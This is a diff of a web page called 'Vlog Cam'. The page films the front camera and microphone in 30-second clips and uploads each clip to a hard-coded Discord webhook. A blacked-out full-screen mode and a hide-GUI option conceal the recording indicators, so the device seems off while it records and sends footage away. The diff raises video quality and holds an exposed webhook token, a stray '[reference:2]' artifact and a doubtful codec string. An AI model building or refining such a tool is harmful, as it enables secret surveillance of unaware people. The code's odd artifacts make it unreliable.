@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Vlog Cam</title>
     <style>
-        /* ── reset & blackout ── */
+        /* ... (CSS is unchanged from your last version) ... */
         *,
         *::before,
         *::after {
@@ -27,7 +27,6 @@
             -webkit-user-select: none;
         }
 
-        /* hidden video element – needed for the stream to stay alive */
         #video {
             position: fixed;
             top: 0;
@@ -39,7 +38,6 @@
             z-index: 0;
         }
 
-        /* fullscreen black canvas – tap target */
         #screen {
             position: fixed;
             top: 0;
@@ -55,13 +53,11 @@
             pointer-events: auto;
         }
 
-        /* ── UI elements (hidden in fullscreen) ── */
         .ui-element {
             transition: opacity 0.3s ease, transform 0.2s ease;
             z-index: 2;
         }
 
-        /* red recording dot – bottom right */
         #dot {
             position: fixed;
             bottom: 80px;
@@ -81,7 +77,6 @@
             box-shadow: none;
         }
 
-        /* clip counter – bottom right */
         #counter {
             position: fixed;
             bottom: 32px;
@@ -101,7 +96,6 @@
             transition: opacity 0.3s;
         }
 
-        /* timer – bottom center */
         #timer {
             position: fixed;
             bottom: 100px;
@@ -125,11 +119,10 @@
             text-align: center;
         }
 
-        /* ── BUTTONS (left side, easy to tap) ── */
         .ctrl-btn {
             position: fixed;
             left: 20px;
-            z-index: 1000; /* well above everything */
+            z-index: 1000;
             background: rgba(255, 255, 255, 0.08);
             border: 1px solid rgba(255, 255, 255, 0.15);
             color: rgba(255, 255, 255, 0.7);
@@ -156,17 +149,14 @@
             transform: scale(0.90);
         }
 
-        /* hide GUI button – above fullscreen */
         #hide-gui-btn {
             bottom: 100px;
         }
 
-        /* fullscreen toggle button – bottom left */
         #fs-btn {
             bottom: 28px;
         }
 
-        /* status text – top center */
         #status {
             position: fixed;
             top: 24px;
@@ -188,7 +178,6 @@
             font-weight: 500;
         }
 
-        /* ── fullscreen overrides (hide everything) ── */
         .fullscreen-ui #dot,
         .fullscreen-ui #counter,
         .fullscreen-ui #timer,
@@ -200,7 +189,6 @@
             transition: opacity 0.4s;
         }
 
-        /* ── hide GUI overrides (hide dot, counter, timer) ── */
         body.gui-hidden #dot,
         body.gui-hidden #counter,
         body.gui-hidden #timer {
@@ -208,14 +196,12 @@
             pointer-events: none !important;
             transition: opacity 0.3s;
         }
-        /* Buttons remain visible */
         body.gui-hidden #hide-gui-btn,
         body.gui-hidden #fs-btn {
             opacity: 1 !important;
             pointer-events: auto !important;
         }
 
-        /* fullscreen background stays black */
         #screen:-webkit-full-screen {
             background: #000;
         }
@@ -223,7 +209,6 @@
             background: #000;
         }
 
-        /* prevent text selection */
         ::selection {
             background: transparent;
         }
@@ -234,13 +219,9 @@
 </head>
 <body>
 
-    <!-- hidden video element -->
     <video id="video" autoplay playsinline muted></video>
-
-    <!-- tap target – full black -->
     <div id="screen" role="button" aria-label="Toggle fullscreen"></div>
 
-    <!-- UI elements -->
     <div id="dot" class="paused ui-element"></div>
     <div id="counter" class="ui-element">◉ 0 clips sent</div>
     <div id="timer" class="ui-element">00:30</div>
@@ -256,9 +237,14 @@
             const WEBHOOK = 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
             const CLIP_DURATION_MS = 30000; // 30 seconds
-            const BITRATE = 50000000; // 50 Mbps for 4K
-            const FPS_IDEAL = 60;
+            
+            // --- FIX 1: HIGH BITRATE (50 Mbps) ---
+            const BITRATE = 50000000; // 50 Mbps for crisp 60fps video[reference:2]
+            const FPS_IDEAL = 60; // --- FIX 2: Explicitly set to 60 FPS ---
+
+            // --- FIX 3: Prioritize modern, efficient codecs ---
             const MIME_TYPES = [
+                'video/webm;codecs=vp09', // VP9 is best for high-quality WebM
                 'video/webm;codecs=vp9',
                 'video/webm;codecs=vp8',
                 'video/webm;codecs=h264',
@@ -283,7 +269,7 @@
             let isRecording = false;
             let isPaused = false;
             let clipTimer = null;
-            let clipRemainingSeconds = 30; // 30 seconds
+            let clipRemainingSeconds = 30;
             let timerInterval = null;
 
             // ─── HELPERS ───────────────────────────────────────────────
@@ -332,7 +318,7 @@
                     clearInterval(timerInterval);
                     timerInterval = null;
                 }
-                clipRemainingSeconds = 30; // reset to 30 seconds
+                clipRemainingSeconds = 30;
                 updateTimerDisplay();
                 timerInterval = setInterval(() => {
                     clipRemainingSeconds--;
@@ -390,7 +376,6 @@
                 } catch (_) { /* ignore */ }
             }
 
-            // Button events with stopPropagation to prevent screen toggle
             fsBtn.addEventListener('click', (e) => {
                 e.stopPropagation();
                 toggleFullscreen();
@@ -413,11 +398,9 @@
             });
             hideGuiBtn.addEventListener('touchstart', (e) => {
                 e.stopPropagation();
-                // Simulate click for mobile
                 hideGuiBtn.click();
             }, { passive: true });
 
-            // Tap on screen toggles fullscreen (only if not clicking a button)
             screenEl.addEventListener('click', (e) => {
                 if (e.target === screenEl) {
                     toggleFullscreen();
@@ -453,6 +436,7 @@
                         facingMode: 'user',
                         width: { ideal: 3840 },
                         height: { ideal: 2160 },
+                        // --- FIX 2: Explicitly set 60fps ---
                         frameRate: { ideal: FPS_IDEAL }
                     },
                     audio: {
@@ -481,7 +465,7 @@
                     return s;
                 } catch (err) {
                     console.error('[VlogCam] getUserMedia failed:', err);
-                    // fallback: try 1080p if 4K not supported
+                    // Fallback to 1080p if 4K fails
                     try {
                         const fallbackConstraints = {
                             video: {
@@ -516,8 +500,12 @@
                 const mimeType = getSupportedMimeType();
                 const options = {
                     mimeType: mimeType || undefined,
+                    // --- FIX 1: High Bitrate ---
                     videoBitsPerSecond: BITRATE,
-                    audioBitsPerSecond: 128000
+                    audioBitsPerSecond: 256000, // Higher audio bitrate for better quality
+                    // --- FIX 4: Try to use constant bitrate mode (experimental) ---
+                    // @ts-ignore - bitrateMode is not yet standard but supported in some browsers
+                    bitrateMode: "constant"
                 };
 
                 try {
@@ -589,9 +577,7 @@
                     clipTimer = null;
                     if (stream && isRecording) {
                         try {
-                            // Reset and start timer for the new clip
                             startTimer();
-
                             recorder = startRecorder(stream);
                             const stopTimer = setTimeout(() => {
                                 if (recorder && recorder.state === 'recording') {
@@ -651,7 +637,7 @@
                 } catch (err) {
                     console.error('[VlogCam] upload failed:', err);
                     setStatus(`✗ upload #${clipCounter} failed`, true);
-                    clipCounter--; // retry same number
+                    clipCounter--;
                     throw err;
                 }
             }
@@ -760,7 +746,7 @@
                     }, CLIP_DURATION_MS);
                     recorder._stopTimer = stopTimer;
 
-                    console.log('[VlogCam] ready, recording 4K 15fps from front camera');
+                    console.log('[VlogCam] ready, recording 4K 60fps from front camera');
                     setStatus('● recording', false);
 
                 } catch (err) {
